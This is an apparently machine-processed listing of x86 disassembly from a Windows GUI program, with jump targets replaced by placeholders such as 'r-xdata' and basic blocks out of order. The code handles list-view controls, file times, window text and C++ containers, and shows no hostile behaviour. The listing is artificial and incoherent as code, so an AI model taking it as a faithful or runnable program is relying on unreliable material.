call j_sub_4b66ed#2
add esp 0x4
lea ecx [ esp + 0x70 ]
mov [ esp + 0x9c ] ecx
mov eax [ esp + 0x70 ]
mov [ esp + 0x9c ] eax
jmp r-xdata
mov eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0xb4 ]
push ecx
lea edx [ esp + 0x60 ]
push edx
lea eax [ esp + 0xe4 ]
push eax
call sub_445f40
add esp 0x10
push 0xffffffff
push 0x0
lea ecx [ esp + 0xb8 ]
push ecx
lea ecx [ esp + 0x78 ]
call sub_4018c0
inc [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov esi [ edx + 0x4 ]
lea eax [ esp + 0x14 ]
push eax
call sub_4b4130
mov edx [ rw-data ]
push 0x0
lea ecx [ esp + 0x1c ]
push ecx
push esi
push edx
mov [ esp + 0x28 ] 0x0
call sub_4b5150
mov edi eax
add esp 0x14
test edi edi
jne r-xdata
lea ecx [ ecx ]
push ebx
call j_sub_4b66ed#2
add esp 0x4
mov edi edi
cmp edi 0xffffffff
jne r-xdata
jmp r-xdata
cmp al 0x3a
je r-xdata
jmp r-xdata
mov [ esp + 0x88 ] 0x1
mov eax [ ebp + 0x14 ]
cmp eax 0x10
jb r-xdata
mov ecx [ ebp + 0x24 ]
mov edx [ ebp + 0x20 ]
push 0x1
lea eax [ esp + 0xdc ]
push eax
push ecx
push edx
call sub_4359e0
add esp 0x10
lea ecx [ esp + 0x88 ]
push ecx
push 0x0
push 0x1006
lea eax [ esp + 0xe4 ]
push esi
mov [ esp + 0xac ] eax
mov [ esp + 0xa0 ] 0x3
call edi
lea edx [ esp + 0x58 ]
push edx
add ebp 0x28
push ebp
call [ FileTimeToLocalFileTime@IAT ]
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x5c ]
push ecx
call [ FileTimeToSystemTime@IAT ]
movzx edx [ esp + 0x78 ]
movzx eax [ esp + 0x76 ]
movzx ecx [ esp + 0x74 ]
push edx
movzx edx [ esp + 0x76 ]
push eax
movzx eax [ esp + 0x76 ]
push ecx
movzx ecx [ esp + 0x78 ]
push edx
push eax
push ecx
lea edx [ esp + 0xf0 ]
push r--data
push edx
call ebx
add esp 0x20
lea ecx [ esp + 0x88 ]
push ecx
push 0x0
push 0x1006
lea eax [ esp + 0xe4 ]
push esi
mov [ esp + 0xac ] eax
mov [ esp + 0xa0 ] 0x4
call edi
mov ebp [ esp + 0x1c ]
push eax
lea edx [ esp + 0xdc ]
push r--data
push edx
call ebx
add esp 0xc
lea ecx [ esp + 0x88 ]
push ecx
push 0x0
push 0x1006
lea eax [ esp + 0xe4 ]
push esi
mov [ esp + 0xac ] eax
mov [ esp + 0xa0 ] 0x1
call edi
mov edx [ ebp + 0x50 ]
push edx
lea eax [ esp + 0xdc ]
push r--data
push eax
call ebx
add esp 0xc
lea edx [ esp + 0x88 ]
push edx
push 0x0
push 0x1006
lea ecx [ esp + 0xe4 ]
push esi
mov [ esp + 0xac ] ecx
mov [ esp + 0xa0 ] 0x2
call edi
mov [ rw-data ] 0x0
mov eax 0x1
jmp r-xdata
push edi
call [ MessageBeep@IAT ]
mov ecx [ esp + 0x68 ]
mov edx [ esp + 0x58 ]
mov eax [ esp + 0x2c ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] eax
mov ecx [ rw-data ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
cmp ecx 0xffffffff
jne r-xdata
cmp [ esp + 0x84 ] 0x10
mov [ esp + 0x5c ] edi
mov [ esp + 0x60 ] edi
mov [ esp + 0x64 ] edi
mov [ esp + 0x8e8 ] 0xffffffff
jb r-xdata
cmp ebx ebp
mov esi ebx
je r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x28 ]
lea edx [ esp + 0x88 ]
push edx
push eax
push 0x102e
push ecx
call [ SendMessageA@IAT ]
mov ecx [ esp + 0x14 ]
mov eax [ ecx ]
cmp eax [ ecx + 0x4 ]
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ ecx + esi * 8 ]
mov ecx [ ecx + esi * 8 + 0x4 ]
sub ecx eax
push ecx
push eax
lea ecx [ esp + 0xb8 ]
call sub_401e80
lea edx [ esp + 0xb0 ]
push edx
lea ecx [ esp + 0x5c ]
call sub_407460
inc esi
cmp esi edi
jl r-xdata
mov ebp [ esp + 0x60 ]
mov ebx [ esp + 0x5c ]
mov ecx esi
call sub_4480e0
add esi 0x1c
cmp esi ebp
jne r-xdata
test edi edi
jle r-xdata
cmp al 0x2a
je r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
mov [ rw-data ] ecx
cmp ecx edi
je r-xdata
mov ecx eax
mov [ rw-data ] ecx
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x68 ]
inc eax
cmp eax ecx
mov [ esp + 0x84 ] 0xf
mov [ esp + 0x80 ] edi
mov [ esp + 0x70 ] 0x0
mov [ esp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x70 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
push ebx
call j_sub_4b66ed#2
add esp 0x4
mov ecx esi
call sub_4480e0
add esi 0x1c
cmp esi ebp
jne r-xdata
cmp al 0x3f
je r-xdata
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x28 ]
mov esi [ esp + 0x1c ]
add eax edx
mov [ esp + 0x14 ] eax
mov ecx [ esp + 0x14 ]
or eax 0xffffffff
mov [ rw-data ] eax
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ rw-data ]
push edi
lea edx [ esp + 0x14 ]
push edx
lea eax [ esp + 0x5e4 ]
push eax
push ecx
mov [ esp + 0x20 ] edi
call sub_4b5150
mov esi eax
add esp 0x10
cmp esi edi
je r-xdata
mov eax [ rw-data ]
push edi
lea ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x5e4 ]
push edx
push eax
mov [ esp + 0x20 ] edi
mov [ esp + 0x28 ] edi
call sub_4b5150
mov esi eax
add esp 0x10
cmp esi edi
je r-xdata
mov eax [ esp + 0x10 ]
lea edx [ esp + 0x30 ]
push edx
lea ecx [ esp + 0x5e0 ]
push eax
mov [ esp + 0x4c ] ecx
mov ecx [ esp + 0x30 ]
push 0x102d
xor ebx ebx
push ecx
mov [ esp + 0x48 ] ebx
mov [ esp + 0x58 ] 0x200
call [ SendMessageA@IAT ]
mov eax 0xf
mov [ esp + 0x84 ] eax
mov [ esp + 0x80 ] ebx
mov [ esp + 0x70 ] bl
xor ebp ebp
mov [ esp + 0x8e8 ] ebx
mov [ esp + 0x5c ] ebx
mov [ esp + 0x60 ] ebp
mov [ esp + 0x64 ] ebx
mov [ esp + 0xc8 ] eax
mov [ esp + 0xc4 ] ebx
mov [ esp + 0xb4 ] 0x0
mov ecx [ rw-data ]
push ebx
lea edx [ esp + 0x18 ]
push edx
lea eax [ esp + 0x5e4 ]
push eax
push ecx
mov [ esp + 0x8f8 ] 0x2
lea esi [ esp + 0x5ec ]
mov [ esp + 0x24 ] ebx
call sub_4b5150
mov edi eax
add esp 0x10
test edi edi
je r-xdata
cmp al 0x22
je r-xdata
mov al [ esp + 0x27 ]
test al al
jne r-xdata
mov eax [ esp + 0x10 ]
mov eax [ esp + 0x10 ]
mov ecx [ eax ]
mov edi [ eax + 0x4 ]
cmp ecx edi
je r-xdata
mov eax [ esp + 0x10 ]
lea ebx [ ebx ]
cmp al 0x3c
je r-xdata
lea eax [ esp + 0x10 ]
push eax
call sub_4b4130
add esp 0x4
jmp r-xdata
xor edi edi
cmp eax edi
je r-xdata
lea edx [ esp + 0x5dc ]
sub ecx edx
cmp ecx [ rw-data ]
jge r-xdata
mov eax [ esp + 0x20 ]
lea ecx [ esp + 0x10 ]
push ecx
call sub_4b4130
add esp 0x4
cmp eax edi
je r-xdata
lea edx [ esp + 0x5dc ]
sub ecx edx
cmp ecx [ rw-data ]
jg r-xdata
cmp al 0x3e
je r-xdata
mov ecx [ esp + 0x20 ]
test ecx ecx
je r-xdata
lea eax [ esp + 0x10 ]
push eax
call sub_4b4130
mov eax [ rw-data ]
mov [ esp + 0x14 ] 0x0
mov ecx [ eax + 0x14 ]
add esp 0x4
test ecx ecx
jne r-xdata
mov ecx [ eax ]
cmp ecx [ eax + 0x4 ]
je r-xdata
cmp [ esp + 0x20 ] edi
je r-xdata
cmp al 0x7c
je r-xdata
mov [ esp + 0x18 ] esi
mov [ esp + 0x20 ] eax
xor edi edi
jmp r-xdata
lea edx [ esp + 0x20 ]
push edx
call sub_4b4130
mov eax [ esp + 0x14 ]
add esp 0x4
xor edi edi
push 0x0
lea ecx [ esp + 0x14 ]
push ecx
push edi
push eax
call sub_4b5150
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
push ebx
call [ SetFocus@IAT ]
mov eax [ esp + 0x14 ]
push 0x1
push eax
push 0x1013
push ebx
call ebp
push 0x2
push 0xffffffff
push 0x100c
push ebx
call ebp
cmp eax 0xffffffff
mov edi 0x3
je r-xdata
mov edx [ rw-data ]
mov [ esp + 0x20 ] eax
mov [ esp + 0x10 ] edi
mov ecx [ eax + 0x4 ]
mov [ esp + 0x18 ] esi
cmp [ edx + 0x14 ] edi
jne r-xdata
lea eax [ esp + 0x20 ]
push eax
call sub_4b4130
mov eax [ esp + 0x14 ]
add esp 0x4
inc ecx
cmp [ esp + 0x18 ] edi
jle r-xdata
mov esi [ esp + 0x14 ]
lea edx [ esp + 0x30 ]
push edx
push esi
push 0x102b
push ebx
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] edi
call ebp
mov eax [ rw-data ]
push 0x0
push esi
push 0x1017
push eax
call ebp
lea ecx [ esp + 0x6c ]
push ecx
push esi
push 0x100e
push ebx
mov [ rw-data ] eax
mov [ esp + 0x7c ] 0x2
call ebp
mov eax [ esp + 0x70 ]
mov edx [ esp + 0x78 ]
mov ecx [ esp + 0x6c ]
push 0x40
sub edx eax
push edx
mov edx [ esp + 0x7c ]
sub edx ecx
push edx
push eax
mov eax [ rw-data ]
push ecx
push 0x0
push eax
call [ SetWindowPos@IAT ]
mov eax [ esp + 0x20 ]
mov esi [ eax ]
mov ebx [ eax + 0x4 ]
lea ecx [ esp + 0x5dc ]
lea edx [ esp + 0x5dc ]
sub esi ecx
sub ebx edx
cmp [ esp + 0x8f8 ] 0x4ee
jne r-xdata
xor esi esi
nop
push edi
lea eax [ esp + 0x14 ]
push eax
push ecx
push edx
call sub_4b5150
mov esi eax
add esp 0x10
cmp esi edi
jne r-xdata
xor ecx ecx
mov [ esp + 0xb4 ] ecx
mov [ esp + 0xb8 ] ecx
mov [ esp + 0xbc ] ecx
mov edx 0xf
mov [ esp + 0x8e8 ] edi
mov [ esp + 0x48 ] edx
mov [ esp + 0x44 ] ecx
mov [ esp + 0x34 ] cl
mov [ esp + 0xa0 ] edx
mov [ esp + 0x9c ] ecx
mov [ esp + 0x8c ] cl
mov edx [ esp + 0x18 ]
xor edi edi
cmp edx ecx
mov [ esp + 0x8e8 ] 0x5
jle r-xdata
mov eax [ rw-data ]
push ebx
push esi
push 0xb1
push eax
call ebp
mov ecx [ esp + 0x14 ]
mov edx [ rw-data ]
mov eax [ rw-data ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] eax
jmp r-xdata
lea ecx [ esp + 0x30 ]
push ecx
push eax
push 0x102b
push ebx
mov [ esp + 0x50 ] edi
mov [ esp + 0x4c ] esi
call ebp
push 0x2
push 0xffffffff
push 0x100c
push ebx
call ebp
cmp eax 0xffffffff
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ eax + 0x4 ]
cmp [ eax ] ecx
je r-xdata
mov ecx [ esp + 0x14 ]
push ecx
lea edx [ esp + 0x34 ]
push edx
lea eax [ esp + 0xb8 ]
push eax
lea ecx [ esp + 0xe4 ]
push ecx
call sub_445f40
add esp 0x10
push esi
lea edx [ esp + 0x5e0 ]
push edx
lea ecx [ esp + 0x90 ]
call sub_401e80
push 0xffffffff
push 0x0
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x94 ]
call sub_4018c0
mov ecx [ esp + 0x20 ]
mov edx [ ecx + 0x4 ]
push edx
lea ecx [ esp + 0x8c ]
call sub_402010
cmp [ esp + 0xa0 ] 0x10
mov eax [ esp + 0x8c ]
jae r-xdata
mov ebp edx
jmp r-xdata
lea eax [ esp + 0x20 ]
push eax
mov [ rw-data ] esi
mov [ rw-data ] ebx
call sub_4b4130
mov esi [ esp + 0x20 ]
mov ecx [ esp + 0x18 ]
add esp 0x4
xor edi edi
push eax
mov eax [ rw-data ]
push eax
call [ SetWindowTextA@IAT ]
mov ecx [ esp + 0x44 ]
mov edx [ rw-data ]
add ecx esi
push ecx
push esi
push 0xb1
push edx
call [ SendMessageA@IAT ]
lea ecx [ esp + 0x88 ]
call sub_4480e0
lea ecx [ esp + 0x30 ]
call sub_4480e0
lea ecx [ esp + 0xb0 ]
mov [ esp + 0x8e8 ] 0xffffffff
call sub_403ab0
lea eax [ esp + 0x8c ]
mov ecx [ eax + edi * 8 ]
mov edx [ eax + edi * 8 + 0x4 ]
sub edx ecx
push edx
push ecx
lea ecx [ esp + 0x38 ]
call sub_401e80
lea eax [ esp + 0x30 ]
push eax
lea ecx [ esp + 0xb4 ]
call sub_407460
inc edi
cmp edi ebp
jl r-xdata
mov eax [ esp + 0x20 ]
sub_447c10
push esi
mov esi [ esp + 0x10 ]
mov eax [ esi ]
cmp eax 0x40
ja r-xdata
xor eax eax
pop esi
retn
movzx eax [ eax + lookup_table_447c7c ]
jmp [ eax * 4 + jump_table_447c70 ]
mov ecx [ esp + 0xc ]
mov eax [ esi + 0x4 ]
xor edx edx
mov dx [ ecx ]
push 0x0
push edx
push eax
call [ OleDuplicateData@IAT ]
test eax eax
mov ecx [ esp + 0x8 ]
mov [ ecx + 0x4 ] eax
jne r-xdata
mov edx [ esi ]
mov [ ecx ] edx
mov eax [ esi + 0x8 ]
mov [ ecx + 0x8 ] eax
mov esi [ esi + 0x8 ]
test esi esi
je r-xdata
mov eax 0x1
pop esi
retn
mov ecx [ esi ]
push esi
call [ ecx + 0x4 ]
sub_447cc0
sub esp 0x40
push ebx
push ebp
mov eax 0x1
push esi
push edi
mov [ esp + 0x10 ] 0xa
mov [ esp + 0x14 ] 0x5
mov [ esp + 0x18 ] eax
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] 0xd
mov [ esp + 0x24 ] 0x9
mov [ esp + 0x28 ] eax
mov [ esp + 0x2c ] 0x8
mov [ esp + 0x30 ] 0xfa0
mov [ esp + 0x34 ] 0xfb4
mov [ esp + 0x38 ] 0xfc8
mov [ esp + 0x3c ] 0xfdc
mov [ esp + 0x40 ] 0xff0
mov [ esp + 0x44 ] 0x1004
mov [ esp + 0x48 ] 0x1018
mov [ esp + 0x4c ] 0x1022
xor ebp ebp
inc ebp
cmp ebp 0x8
jl r-xdata
jmp r-xdata
mov esi [ esp + 0x58 ]
mov edi [ esp + ebp * 4 + 0x10 ]
xor ebx ebx
cmp esi ebp
setne bl
xor esi esi
dec ebx
and ebx 0x5
test edi edi
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x40
retn
mov eax [ esp + ebp * 4 + 0x30 ]
push ebx
add eax esi
push eax
mov eax [ esp + 0x5c ]
push eax
call [ GetDlgItem@IAT ]
push eax
call [ ShowWindow@IAT ]
inc esi
cmp esi edi
jl r-xdata
sub_447d90
mov ecx [ esp + 0xc ]
mov al [ ecx + 0x8 ]
test al al
je r-xdata
mov eax [ esp + 0x4 ]
imul eax eax 0x64
cdq
idiv [ esp + 0x8 ]
push 0x0
push eax
mov eax [ ecx + 0x4 ]
push 0x402
push 0xdd2
push eax
call [ GetDlgItem@IAT ]
push eax
call [ PostMessageA@IAT ]
xor eax eax
retn 0xc
mov eax 0x1
retn 0xc
sub_447de0
mov eax [ ecx + 0x4 ]
test eax eax
jne r-xdata
mov ecx [ ecx + 0x8 ]
sub ecx eax
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
mov eax edx
retn
retn
sub_447e50
mov eax [ ecx ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
retn
mov edx [ eax + 0x8 ]
push ebx
mov bl [ edx + 0x29 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov eax [ edx ]
mov bl [ eax + 0x29 ]
test bl bl
jne r-xdata
mov [ ecx ] eax
pop ebx
lea esp [ esp ]
mov [ ecx ] edx
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov edx eax
mov eax [ edx ]
mov bl [ eax + 0x29 ]
test bl bl
je r-xdata
mov edx [ ecx ]
cmp edx [ eax + 0x8 ]
jne r-xdata
sub_447eb0
mov edx [ esp + 0x4 ]
mov eax [ edx + 0x8 ]
push ebx
push esi
mov esi [ eax ]
mov [ edx + 0x8 ] esi
mov esi [ eax ]
mov bl [ esi + 0x29 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_447f10
mov edx [ esp + 0x4 ]
mov eax [ edx ]
push ebx
push esi
mov esi [ eax + 0x8 ]
mov [ edx ] esi
mov esi [ eax + 0x8 ]
mov bl [ esi + 0x29 ]
test bl bl
jne r-xdata
mov esi [ edx + 0x4 ]
mov [ eax + 0x4 ] esi
mov ecx [ ecx + 0x4 ]
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov [ esi + 0x4 ] edx
mov ecx [ edx + 0x4 ]
cmp edx [ ecx + 0x8 ]
jne r-xdata
mov [ ecx + 0x4 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
mov [ ecx + 0x8 ] eax
pop esi
mov [ eax + 0x8 ] edx
mov [ edx + 0x4 ] eax
pop ebx
retn 0x4
sub_447f70
mov eax [ ecx ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov edx [ eax ]
push ebx
mov bl [ edx + 0x29 ]
test bl bl
jne r-xdata
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
retn
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x29 ]
test bl bl
jne r-xdata
pop ebx
retn
lea ecx [ ecx ]
mov [ ecx ] edx
pop ebx
retn
mov edx eax
mov eax [ edx + 0x8 ]
mov bl [ eax + 0x29 ]
test bl bl
je r-xdata
mov dl [ eax + 0x29 ]
test dl dl
jne r-xdata
mov [ ecx ] eax
mov eax [ eax + 0x4 ]
mov dl [ eax + 0x29 ]
test dl dl
je r-xdata
mov [ ecx ] eax
mov edx [ ecx ]
cmp edx [ eax ]
jne r-xdata
sub_447fd0
cmp [ eax + 0x18 ] 0x10
jb r-xdata
lea ecx [ eax + 0x4 ]
mov ecx [ eax + 0x4 ]
jmp r-xdata
retn
mov al [ ecx ]
mov dl al
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
ja r-xdata
cmp [ ecx ] 0x0
je r-xdata
cmp al 0x2f
je r-xdata
add ecx 0x2
jmp r-xdata
mov [ ecx ] 0x5f
cmp al 0x5c
je r-xdata
cmp [ ecx ] 0x0
jne r-xdata
cmp al 0x3a
jne r-xdata
inc ecx
sub_448010
push 0x2c
call sub_4b573e
add esp 0x4
test eax eax
je r-xdata
lea ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov [ eax ] 0x0
lea ecx [ eax + 0x8 ]
test ecx ecx
je r-xdata
mov [ ecx ] 0x0
mov [ eax + 0x28 ] 0x1
mov [ eax + 0x29 ] 0x0
retn
mov [ ecx ] 0x0
sub_448050
push esi
mov esi ecx
cmp [ esi + 0x28 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x28 ] 0xf
mov [ esi + 0x24 ] eax
mov [ esi + 0x14 ] al
pop esi
retn
mov eax [ esi + 0x14 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_448080
mov eax [ esp + 0xc ]
mov edx [ esp + 0x8 ]
push eax
push ecx
mov ecx [ esp + 0x14 ]
push ecx
push ecx
mov eax esp
push ecx
mov ecx [ esp + 0x18 ]
mov [ eax ] edx
mov eax esp
mov [ eax ] ecx
call sub_453050
add esp 0x14
retn 0xc
sub_4480b0
push esi
mov esi ecx
cmp [ esi + 0x24 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x24 ] 0xf
mov [ esi + 0x20 ] eax
mov [ esi + 0x10 ] al
pop esi
retn
mov eax [ esi + 0x10 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_4480e0
push esi
mov esi ecx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
xor eax eax
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x14 ] eax
mov [ esi + 0x4 ] al
pop esi
retn
mov eax [ esi + 0x4 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
sub_448110
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0xc ]
cmp esi ebx
je r-xdata
mov eax [ esp + 0x14 ]
pop esi
pop ebx
retn
push edi
mov edi [ esp + 0x18 ]
push 0xffffffff
push 0x0
push esi
mov ecx edi
call sub_401dd0
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
add esi 0x20
add edi 0x20
cmp esi ebx
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_448150
push ebx
mov ebx [ esp + 0xc ]
push esi
mov esi [ esp + 0x14 ]
cmp ebx esi
je r-xdata
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x18 ]
pop esi
mov [ eax ] ecx
pop ebx
retn
push edi
mov edi [ esp + 0x1c ]
push 0xffffffff
push 0x0
sub esi 0x20
sub edi 0x20
push esi
mov ecx edi
call sub_401dd0
cmp esi ebx
mov eax [ esi + 0x1c ]
mov [ edi + 0x1c ] eax
jne r-xdata
mov eax [ esp + 0x10 ]
mov [ eax ] edi
pop edi
pop esi
pop ebx
retn
sub_4481a0
push 0xffffffff
push sub_4c04c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x44
mov eax r--data
mov [ esp + 0x18 ] 0xf
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x4 ] 0x0
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x8 ]
call sub_401e80
lea eax [ esp ]
push eax
lea ecx [ esp + 0x20 ]
mov [ esp + 0x50 ] 0x0
call sub_402340
push r--data
lea ecx [ esp + 0x20 ]
push ecx
mov [ esp + 0x24 ] r--data
call sub_4b5bd2
int3
sub_448220
push ebp
mov ebp esp
push 0xffffffff
push sub_4c0491
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0xc
push ebx
push esi
push edi
mov [ ebp - 0x10 ] esp
push 0x2c
call sub_4b573e
mov esi eax
xor ebx ebx
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x18 ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x1
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn 0x14
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov [ esi ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x4 ] ecx
push 0xffffffff
lea ecx [ esi + 0xc ]
mov [ esi + 0x8 ] edx
push ebx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push eax
mov [ ecx + 0x4 ] bl
call sub_401dd0
mov cl [ ebp + 0x18 ]
mov [ esi + 0x28 ] cl
mov [ esi + 0x29 ] bl
sub_4482d0
push 0xffffffff
push sub_4c04c8
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x4c
push esi
push edi
mov edi [ esp + 0x68 ]
mov al [ edi + 0x29 ]
test al al
mov [ esp + 0x8 ] ecx
je r-xdata
push ebx
mov ebx edi
push ebp
lea ecx [ esp + 0x70 ]
mov [ esp + 0x14 ] ebx
call sub_447e50
mov ebp [ edi ]
mov al [ ebp + 0x29 ]
test al al
lea eax [ edi + 0x8 ]
jne r-xdata
xor esi esi
mov eax r--data
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] esi
mov [ esp + 0x14 ] 0x0
lea edx [ eax + 0x1 ]
mov ebp [ eax ]
mov edx [ eax ]
mov cl [ edx + 0x29 ]
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x18 ]
call sub_401e80
lea eax [ esp + 0x10 ]
push eax
lea ecx [ esp + 0x30 ]
mov [ esp + 0x60 ] esi
call sub_402340
push r--data
lea ecx [ esp + 0x30 ]
push ecx
mov [ esp + 0x34 ] r--data
call sub_4b5bd2
mov ecx [ ebx ]
mov [ ecx + 0x4 ] edi
mov edx [ ebx ]
mov [ edi ] edx
cmp edi [ ebx + 0x8 ]
jne r-xdata
mov al [ ebp + 0x29 ]
test al al
mov esi [ ebx + 0x4 ]
jne r-xdata
cmp edi ebx
jne r-xdata
mov eax [ esp + 0x70 ]
mov edi eax
add eax 0x8
mov cl [ ebp + 0x29 ]
test cl cl
mov esi [ edi + 0x4 ]
jne r-xdata
mov esi edi
jmp r-xdata
mov ecx [ esp + 0x10 ]
mov eax [ ecx + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
mov [ ebp + 0x4 ] esi
mov [ esi ] ebp
mov ecx [ ebx + 0x8 ]
mov [ eax ] ecx
mov edx [ ebx + 0x8 ]
mov [ edx + 0x4 ] edi
mov [ ebp + 0x4 ] esi
mov eax [ esp + 0x10 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x4 ] ebx
jne r-xdata
cmp [ esi ] ebx
jne r-xdata
mov [ eax + 0x4 ] ebp
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax ] ebx
jne r-xdata
mov [ eax + 0x4 ] edi
jmp r-xdata
mov [ esi + 0x8 ] ebp
mov [ esi ] ebp
jmp r-xdata
mov edi [ ecx + 0x4 ]
cmp [ edi ] ebx
jne r-xdata
mov [ eax + 0x8 ] edi
mov [ eax ] edi
jmp r-xdata
mov ecx [ ebx + 0x4 ]
mov [ edi + 0x4 ] ecx
mov dl [ ebx + 0x28 ]
mov al [ edi + 0x28 ]
mov [ edi + 0x28 ] dl
mov [ ebx + 0x28 ] al
mov edi [ ecx + 0x4 ]
cmp [ edi + 0x8 ] ebx
jne r-xdata
mov al [ ebp + 0x29 ]
test al al
je r-xdata
cmp [ eax + 0x24 ] 0x10
pop ebp
pop ebx
jb r-xdata
mov eax [ edi + 0x4 ]
cmp ebp [ eax + 0x4 ]
je r-xdata
mov eax [ esp + 0x14 ]
mov cl [ eax + 0x28 ]
mov edi [ esp + 0x10 ]
mov bl 0x1
cmp cl bl
jne r-xdata
mov al [ ebp + 0x29 ]
test al al
je r-xdata
push ebp
call sub_447e30
mov ecx [ esp + 0x14 ]
add esp 0x4
mov eax esi
jmp r-xdata
mov eax [ esp + 0xc ]
mov [ eax + 0x24 ] 0xf
mov [ eax + 0x20 ] 0x0
push eax
mov [ eax + 0x10 ] 0x0
call j_sub_4b66ed#2
mov eax [ edi + 0x8 ]
add esp 0x4
test eax eax
jbe r-xdata
mov eax [ eax + 0x10 ]
push eax
call j_sub_4b66ed#2
add esp 0x4
mov eax [ esp + 0x14 ]
mov [ ebp + 0x28 ] bl
cmp [ ebp + 0x28 ] bl
jne r-xdata
push ebp
call sub_447e10
add esp 0x4
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax esi
mov [ edi + 0x8 ] eax
jmp r-xdata
mov [ edi ] eax
mov ecx [ esp + 0x68 ]
mov eax [ esp + 0x64 ]
mov [ eax ] ecx
mov ecx [ esp + 0x54 ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
add esp 0x58
retn 0x8
dec eax
mov [ edi + 0x8 ] eax
mov eax [ esi ]
cmp ebp eax
jne r-xdata
mov cl [ eax + 0x28 ]
test cl cl
jne r-xdata
mov eax [ esi + 0x8 ]
mov cl [ eax + 0x28 ]
test cl cl
jne r-xdata
mov cl [ eax + 0x29 ]
test cl cl
jne r-xdata
mov [ eax + 0x28 ] bl
push esi
mov ecx edi
mov [ esi + 0x28 ] 0x0
call sub_447f10
mov eax [ esi ]
mov cl [ eax + 0x29 ]
test cl cl
jne r-xdata
mov [ eax + 0x28 ] bl
push esi
mov ecx edi
mov [ esi + 0x28 ] 0x0
call sub_447eb0
mov eax [ esi + 0x8 ]
mov eax [ edi + 0x4 ]
mov ecx [ eax + 0x4 ]
mov ebp esi
